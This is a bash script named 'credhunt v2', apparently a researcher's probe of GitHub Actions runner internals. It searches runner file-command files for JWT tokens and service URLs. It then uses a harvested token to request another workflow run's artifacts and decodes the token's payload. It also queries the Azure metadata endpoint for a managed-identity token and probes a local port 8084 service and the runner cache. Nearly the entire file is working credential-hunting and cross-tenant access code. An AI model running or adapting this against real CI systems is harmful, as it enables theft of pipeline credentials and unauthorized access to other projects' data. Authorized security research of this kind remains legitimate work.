#!/usr/bin/env bash
# credhunt v2: file-commands credentials, IMDS identity existence (no token grab), mono:8084 probe.
set -u

echo "== [A] GITHUB_ARTIFACTS file-commands content (secrets redacted in display)"
for F in "${GITHUB_ARTIFACTS:-/nonexistent}" "${GITHUB_ARTIFACTS_LIST:-/nonexistent}"; do
  if test -s "$F"; then
    echo "--- $F ($(stat -c%s "$F") bytes), shape (values >14 chars redacted):"
    python3 - "$F" <<'EOF'
import sys
raw = open(sys.argv[1], errors='replace').read()
print(raw[:1200].__class__ and '\n'.join(
    (l[:l.find('=')+1] + '<redacted len=%d>' % (len(l) - l.find('=') - 1))
    if ('=' in l and len(l) > 60 and 'http' not in l.lower()) else l[:200]
    for l in raw.splitlines()[:20]))
EOF
  else
    echo "--- $F NOT FOUND/empty"
  fi
done

echo "== [B] hunt token/urls in file-commands"
FTOK=""
FURL=""
for F in "${GITHUB_ARTIFACTS:-}" "${GITHUB_ARTIFACTS_LIST:-}"; do
  test -s "$F" || continue
  if [ -z "$FURL" ]; then
    FURL=$(grep -oE 'https://[a-zA-Z0-9.-]+\.(actions\.githubusercontent|github)\.com[^" ]*' "$F" 2>/dev/null | head -1)
  fi
  if [ -z "$FTOK" ]; then
    FTOK=$(grep -oE '[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' "$F" 2>/dev/null | head -1)
  fi
done
echo "hunt: jwt_found=$([ -n "$FTOK" ] && echo YES || echo NO)  url=${FURL:-none}"

if [ -n "$FTOK" ] && [ -n "$FURL" ]; then
  echo "== [C] cross-repo oracle with file-commands credential"
  BASE="$FURL"
  [[ "$BASE" == */ ]] || BASE="$BASE/"
  B_RUN_ID="${B_RUN_ID:-0}"
  for RID in "$GITHUB_RUN_ID" "$B_RUN_ID"; do
    tag=$([ "$RID" = "$GITHUB_RUN_ID" ] && echo own || echo cross)
    C=$(curl -sS -m 20 -o /tmp/o.out -w "%{http_code}" -H "Authorization: Bearer $FTOK" \
        "${BASE}_apis/pipelines/workflowruns/$RID/artifacts?api-version=6.0-preview" 2>/dev/null || echo 000)
    echo "GET artifacts run=$RID ($tag): $C   <-- cross 200=HIGH FINDING"
    head -c 250 /tmp/o.out; echo
  done
  echo "-- JWT payload:"
  python3 - "$FTOK" <<'EOF'
import base64, json, sys
try:
    p = sys.argv[1].split('.')[1]
    p += '=' * (-len(p) % 4)
    print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=1, sort_keys=True)[:900])
except Exception as e:
    print('decode error:', e)
EOF
else
  echo "== [C] skipped (no credential found in file commands)"
fi

echo "== [D] IMDS identity existence probe (status/error code only, NEVER prints token)"
IM=`curl -sS -m 3 -w '\n%{http_code}' -H 'Metadata: true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' 2>/dev/null`
IM_CODE=$(echo "$IM" | tail -1)
IM_BODY=$(echo "$IM" | head -n -1)
echo "identity endpoint: HTTP $IM_CODE"
echo "$IM_BODY" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    err = d.get('error') or d.get('ExceptionMessage') or d.get('Message')
    print('error field:', err)
    print('contains access_token:', 'access_token' in json.dumps(d))
except Exception:
    print('(non-json body, len=%d)' % len(sys.stdin.read()))
" || true

echo "== [E] mono:8084 local service probe"
curl -sS -m 5 -o /tmp/m.out -w "GET / : %{http_code} (%{size_download}B)\n" http://127.0.0.1:8084/ 2>/dev/null || echo "GET / : unreachable"
head -c 300 /tmp/m.out 2>/dev/null; echo
curl -sS -m 5 -o /dev/null -w "GET /xyz: %{http_code}\n" http://127.0.0.1:8084/xyz 2>/dev/null
sudo ss -tlnp 2>/dev/null | grep 8084 || true

echo "== [F] runner cached dir"
ls -la /home/runner/actions-runner/cached/ 2>/dev/null | head -10 || true
echo "CREDHUNT2 DONE"
